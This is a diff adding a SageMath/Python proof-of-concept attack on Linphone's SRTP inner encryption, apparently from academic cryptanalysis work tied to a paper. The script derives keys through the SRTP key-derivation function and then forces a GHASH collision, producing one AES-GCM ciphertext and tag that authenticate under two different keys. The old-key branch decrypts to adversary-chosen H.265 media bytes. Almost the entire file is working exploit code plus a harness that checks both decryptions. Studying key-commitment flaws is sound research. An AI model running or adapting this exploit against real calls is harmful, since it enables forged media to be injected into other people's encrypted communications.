@@ -1,0 +1,247 @@
+"""End-to-end PoC of per-packet ambiguous AES-GCM ciphertext for Linphone
+inner-encryption (paper App. C eq. 14-22 + Appendix A GHASH collision).
+
+Pipeline:
+  inner_master_key_sender_OLD, _NEW   (each 32 B = AES-256 master key)
+  master_salt                         (12 B, derived as CSPI[:12] in
+                                       Linphone's ekt->mSrtpMasterSalt
+                                       for AEAD_AES_256_GCM)
+       │
+       ▼  SRTP-KDF (RFC 3711 §4.3.3 with libsrtp's zero-pad to 14 B,
+                    paper eq. 16-17)
+  (K_enc_OLD, S_session_OLD), (K_enc_NEW, S_session_NEW)
+       │
+       ▼  per-packet, with sender's SSRC + ROC + SEQ
+  nonce_OLD,  nonce_NEW                (12 B each)
+       │
+       ▼  GHASH collision (gcm_1block, paper App. A)
+  one ambiguous (ciphertext, tag16) that authenticates under
+  (K_enc_OLD, nonce_OLD) AND (K_enc_NEW, nonce_NEW), with NO AAD on
+  either side (we revisit AAD = RTP header in Step 2.4).
+
+What it proves: at the cryptographic core, the existing gcm.sage routine
+extends cleanly to the SRTP-derived key+nonce setting. Both decryptions
+succeed; the K_OLD branch recovers the adversary's chosen plaintext.
+"""
+
+from binascii import hexlify, unhexlify
+import operator
+
+from Crypto.Cipher import AES
+
+load('attack/crypto/util.sage')
+load('attack/crypto/gcm.sage')
+load('attack/crypto/srtp_kdf.sage')
+
+
+def pad16(x: bytes) -> bytes:
+    if len(x) % 16 != 0:
+        x = x + b"\x00" * (16 - len(x) % 16)
+    return x
+
+
+def aes_ctr_keystream(k_enc: bytes, nonce12: bytes, nbytes: int) -> bytes:
+    """AES-CTR keystream for AES-GCM body (J0 = nonce || 0x00000001; counter
+    starts at J0+1). pycryptodome's GCM does this internally — we just
+    encrypt zero bytes to extract it."""
+    return AES.new(k_enc, AES.MODE_GCM, nonce=nonce12).encrypt(b"\x00" * nbytes)
+
+
+def _pad_aad_to_blocks(aad: bytes):
+    """Zero-pad AAD up to a multiple of 16 bytes and return a list of
+    16-byte block bytestrings. AAD length in bytes is returned separately
+    so the GCM length-encoding stays accurate; the trailing zero pad is
+    invisible to AES-GCM (the spec only feeds aad_len_in_bits into the
+    final length block, not the padded byte count)."""
+    if not aad:
+        return 0, []
+    pad = (-len(aad)) % 16
+    aad_padded = aad + b"\x00" * pad
+    blocks = [aad_padded[i*16:(i+1)*16] for i in range(len(aad_padded) // 16)]
+    return len(aad), blocks
+
+
+def build_ambiguous_under_inner_keys(
+        plaintext: bytes,
+        inner_master_key_old: bytes,
+        inner_master_key_new: bytes,
+        master_salt: bytes,
+        ssrc: int, roc: int, seq: int,
+        adjustment_block_offset: int = -1,
+        aad: bytes = b""):
+    """Build a per-packet ambiguous AES-GCM ciphertext under the two
+    inner-encryption keys defined by (inner_master_key_sender,
+    master_salt, SSRC, ROC, SEQ).
+
+    `master_salt`: the 12-byte salt Linphone hands to libsrtp via
+    `ms_media_stream_sessions_set_srtp_inner_send_key` for the
+    AEAD_AES_256_GCM suite. Internally zero-extended to 14 bytes for the
+    KDF (libsrtp behaviour). A 14-byte salt is also accepted directly,
+    which is what test fixtures use for the AES-CM legacy convention.
+
+    `plaintext` is the bytes the K_OLD receiver should recover, modulo
+    one 16-byte adjustment block that the caller has already reserved.
+
+    `adjustment_block_offset`:
+      * default -1: the adjustment block is appended at the end of the
+        plaintext (legacy behaviour from the standalone math test).
+      * otherwise: the byte offset inside `plaintext` at which the
+        16 bytes of the adjustment slot live. plaintext[offset:offset+16]
+        will be overwritten in the returned ciphertext to satisfy the
+        GHASH collision equation. The H.265 plaintext layout from
+        h265_nal.sage uses this form, placing the adjustment slot inside
+        a Filler Data NAL.
+
+    `aad` (paper App. C eq. 20-21 + RFC 8723 inner encryption):
+        the per-packet RTP fixed header (12 B) plus the CSRC list
+        (4 × CC bytes), without the RTP extension header (Linphone's
+        ms_srtp.cpp zeros `extbit` before handing the synthetic packet
+        to libsrtp's srtp_protect, so the extension is excluded). The
+        same AAD is bound to both K_OLD and K_NEW, so the two
+        decryption paths perform GHASH over identical AAD blocks.
+
+    Returns a dict carrying the derived keys/nonces (for debugging) and
+    the final (ciphertext, tag16) pair."""
+    # SRTP-KDF derivation (paper eq. 14-17).
+    kd_old = derive_inner_keys(inner_master_key_old, master_salt)
+    kd_new = derive_inner_keys(inner_master_key_new, master_salt)
+    k_enc_old, s_old = kd_old["K_enc"], kd_old["S_session"]
+    k_enc_new, s_new = kd_new["K_enc"], kd_new["S_session"]
+
+    # Per-packet nonces (paper eq. 18-19).
+    nonce_old = build_packet_nonce(ssrc, roc, seq, s_old)
+    nonce_new = build_packet_nonce(ssrc, roc, seq, s_new)
+
+    # Treat the adjustment slot inside `plaintext` as a placeholder; the
+    # bytes there are irrelevant. If the caller did not place an
+    # adjustment slot inside, we append one trailing 16-byte block (legacy
+    # mode of test_packet_ambiguous.sage).
+    if adjustment_block_offset < 0:
+        # Append mode: pad plaintext to multiple of 16 and add 16 extra
+        # zero bytes that the GHASH solver will fill in.
+        pt_padded = pad16(plaintext)
+        c_base_pt = pt_padded + b"\x00" * 16
+        adj_off = len(pt_padded)
+    else:
+        if adjustment_block_offset + 16 > len(plaintext):
+            raise ValueError("adjustment slot extends past plaintext end")
+        if len(plaintext) % 16 != 0:
+            raise ValueError("when adjustment_block_offset is given, "
+                             "plaintext length must be a multiple of 16")
+        if adjustment_block_offset % 16 != 0:
+            raise ValueError("adjustment_block_offset must be 16-byte aligned")
+        c_base_pt = bytes(plaintext)
+        adj_off = adjustment_block_offset
+
+    # AES-CTR keystream covering the whole plaintext.
+    ks_old = aes_ctr_keystream(k_enc_old, nonce_old, len(c_base_pt))
+
+    # Encrypt under K_enc_OLD everywhere except the adjustment block,
+    # which we leave zero so the GHASH solver can pick the value freely.
+    c_base = bytearray(len(c_base_pt))
+    for i in range(len(c_base_pt)):
+        if adj_off <= i < adj_off + 16:
+            c_base[i] = 0
+        else:
+            c_base[i] = c_base_pt[i] ^^ ks_old[i]
+    c_full = bytes(c_base)
+
+    n_blocks = len(c_full) // 16
+    ct_blocks = [c_full[i*16:(i+1)*16] for i in range(n_blocks)]
+    correction_idx = adj_off // 16
+
+    # AAD is identical for both keys (paper §App. C uses the same RTP
+    # fixed header + CSRC for both inner encryptions; only the key and
+    # nonce change between K_OLD and K_NEW).
+    aad_len, aad_blocks = _pad_aad_to_blocks(aad)
+
+    # GHASH collision with the SRTP-derived (key, nonce, aad) tuples.
+    _, _, final_blocks, tag16 = gcm_1block(
+        k_enc_old, k_enc_new,
+        nonce_old, nonce_new,
+        correction_idx,
+        len(c_full), ct_blocks,
+        aad_len, aad_blocks,
+        aad_len, aad_blocks,
+    )
+    ciphertext = b"".join(final_blocks)
+
+    return {
+        "K_enc_old": k_enc_old, "K_enc_new": k_enc_new,
+        "S_session_old": s_old, "S_session_new": s_new,
+        "nonce_old": nonce_old, "nonce_new": nonce_new,
+        "ciphertext": ciphertext,
+        "tag16": tag16,
+    }
+
+
+def main():
+    # Inputs the attacker has during the Phase-1 grace window.
+    inner_master_key_old = unhexlify("000102030405060708090a0b0c0d0e0f"
+                                    "101112131415161718191a1b1c1d1e1f")
+    inner_master_key_new = unhexlify("ffeeddccbbaa99887766554433221100"
+                                    "fedcba9876543210ffeeddccbbaa9988")
+    # 12-byte master_salt as Linphone hands it to libsrtp for AEAD-256-GCM
+    # (derived from a 16-byte CSPI via ekt->mSrtpMasterSalt truncation).
+    master_salt = unhexlify("aabbccddeeff001122334455")
+
+    # Per-packet RTP context (a hypothetical frame).
+    ssrc, roc, seq = 0xdeadbeef, 0x00000007, 0x0042
+
+    plaintext = b"adversary-chosen H.265 NAL bytes go here ..."
+
+    print(f"[*] inner_master_key_OLD = {hexlify(inner_master_key_old).decode()}")
+    print(f"[*] inner_master_key_NEW = {hexlify(inner_master_key_new).decode()}")
+    print(f"[*] master_salt (12 B)   = {hexlify(master_salt).decode()}")
+    print(f"[*] SSRC, ROC, SEQ       = 0x{ssrc:08x}, 0x{roc:08x}, 0x{seq:04x}")
+    print(f"[*] plaintext  ({len(plaintext)} B): {plaintext!r}")
+    print()
+
+    r = build_ambiguous_under_inner_keys(
+        plaintext, inner_master_key_old, inner_master_key_new,
+        master_salt, ssrc, roc, seq,
+    )
+    print(f"[*] derived K_enc_OLD    = {hexlify(r['K_enc_old']).decode()}")
+    print(f"[*] derived K_enc_NEW    = {hexlify(r['K_enc_new']).decode()}")
+    print(f"[*] derived nonce_OLD    = {hexlify(r['nonce_old']).decode()}")
+    print(f"[*] derived nonce_NEW    = {hexlify(r['nonce_new']).decode()}")
+    print(f"[*] ciphertext  ({len(r['ciphertext'])} B) = "
+          f"{hexlify(r['ciphertext']).decode()}")
+    print(f"[*] tag (16 B)           = {hexlify(r['tag16']).decode()}")
+    print()
+
+    # Verify under K_enc_OLD with nonce_OLD: should recover the plaintext.
+    cipher_old = AES.new(r["K_enc_old"], AES.MODE_GCM, nonce=r["nonce_old"])
+    try:
+        pt_old = cipher_old.decrypt_and_verify(r["ciphertext"], r["tag16"])
+        recovered_old = pt_old[:len(plaintext)]
+        ok_old = (recovered_old == plaintext)
+        print(f"[+] verify under (K_OLD, nonce_OLD): PASS  recovered={recovered_old!r} "
+              f"({'match' if ok_old else 'MISMATCH'})")
+    except ValueError as e:
+        print(f"[-] verify under (K_OLD, nonce_OLD): FAIL ({e})")
+        ok_old = False
+
+    # Verify under K_enc_NEW with nonce_NEW: tag must verify, plaintext
+    # bytes will be pseudo-random.
+    cipher_new = AES.new(r["K_enc_new"], AES.MODE_GCM, nonce=r["nonce_new"])
+    try:
+        pt_new = cipher_new.decrypt_and_verify(r["ciphertext"], r["tag16"])
+        diff = (pt_new[:len(plaintext)] != plaintext)
+        print(f"[+] verify under (K_NEW, nonce_NEW): PASS  first 16 B = "
+              f"{hexlify(pt_new[:16]).decode()}  (differs from OLD: {diff})")
+        ok_new = True
+    except ValueError as e:
+        print(f"[-] verify under (K_NEW, nonce_NEW): FAIL ({e})")
+        ok_new = False
+
+    print()
+    if ok_old and ok_new:
+        print("[*] OK: per-packet ambiguous ciphertext authenticates under "
+              "both SRTP-derived (K_enc, nonce) pairs.")
+    else:
+        raise SystemExit("[-] test failed")
+
+
+if __name__ == "__main__":
+    main()
